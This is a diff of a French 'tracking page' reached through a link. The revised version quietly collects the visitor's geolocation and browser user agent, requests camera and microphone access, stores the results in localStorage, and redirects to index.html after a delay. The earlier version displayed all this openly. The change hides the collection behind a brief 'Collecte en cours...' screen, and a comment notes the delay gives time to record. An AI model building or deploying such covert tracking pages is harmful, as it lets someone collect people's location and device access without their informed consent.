@@ -2,95 +2,46 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Page de Traque</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f0f0f0;
-      color: #333;
-      text-align: center;
-      padding: 50px;
-    }
-    .info {
-      background-color: #d1e7ff;
-      padding: 20px;
-      margin-top: 20px;
-      border-radius: 5px;
-    }
-    .info h3 {
-      margin-bottom: 15px;
-    }
-    video {
-      margin-top: 20px;
-      max-width: 80%;
-      border: 2px solid #333;
-      border-radius: 8px;
-    }
-  </style>
+  <title>Track</title>
 </head>
 <body>
-
-  <h1>Page de Traque</h1>
-  <p>Merci d'avoir cliqué sur le lien de traque ! Voici les informations collectées :</p>
-
-  <div class="info">
-    <h3>Informations collectées :</h3>
-    <p id="geo">Géolocalisation : En attente...</p>
-    <p id="browser">Navigateur : En attente...</p>
-    <p id="uniqueId">ID de Traque : En attente...</p>
-    <p id="cameraStatus">Caméra : En attente...</p>
-    <p id="microStatus">Microphone : En attente...</p>
-  </div>
-
-  <video id="video" autoplay></video>
+  <h1>Collecte en cours...</h1>
 
   <script>
-    // Récupérer l'ID de traque depuis l'URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const uniqueId = urlParams.get('id') || 'Inconnu';
-
-    // Afficher l'ID de traque
-    document.getElementById('uniqueId').textContent = `ID de Traque : ${uniqueId}`;
-
-    // Afficher les informations du navigateur
-    document.getElementById('browser').textContent = `Navigateur : ${navigator.userAgent}`;
-
-    // Collecter la géolocalisation
+    // GEOLOCALISATION
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        document.getElementById('geo').textContent = `Géolocalisation : Latitude: ${lat}, Longitude: ${lon}`;
-      }, function(error) {
-        document.getElementById('geo').textContent = 'Géolocalisation : Non disponible';
-      });
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+          localStorage.setItem("geo", coords);
+        },
+        () => {
+          localStorage.setItem("geo", "Refusée");
+        }
+      );
     } else {
-      document.getElementById('geo').textContent = 'Géolocalisation : Non supportée';
+      localStorage.setItem("geo", "Non supportée");
     }
 
-    // Demander l'accès à la caméra et au micro
+    // BROWSER
+    localStorage.setItem("browser", navigator.userAgent);
+
+    // CAM & MICRO
     navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-      .then(function(stream) {
-        // Afficher la vidéo
-        const videoElement = document.getElementById('video');
-        videoElement.srcObject = stream;
-
-        // Afficher que la caméra et le micro sont activés
-        document.getElementById('cameraStatus').textContent = 'Caméra : Activée';
-        document.getElementById('microStatus').textContent = 'Microphone : Activé';
+      .then((stream) => {
+        localStorage.setItem("cam", "Activée");
+        localStorage.setItem("mic", "Activé");
+        stream.getTracks().forEach(track => track.stop());
       })
-      .catch(function(error) {
-        // Afficher un message d'erreur si la caméra ou le micro est refusé
-        if (error.name === "NotFoundError" || error.name === "PermissionDeniedError") {
-          document.getElementById('cameraStatus').textContent = 'Caméra : Refusée';
-          document.getElementById('microStatus').textContent = 'Microphone : Refusé';
-        } else {
-          document.getElementById('cameraStatus').textContent = 'Caméra : Erreur';
-          document.getElementById('microStatus').textContent = 'Microphone : Erreur';
-        }
+      .catch(() => {
+        localStorage.setItem("cam", "Refusée");
+        localStorage.setItem("mic", "Refusé");
       });
-  </script>
 
+    // ATTENTE AVANT REDIRECTION (donner le temps d’enregistrer)
+    setTimeout(() => {
+      window.location.replace("index.html");
+    }, 5000); // <-- allonge un peu le délai
+  </script>
 </body>
 </html>
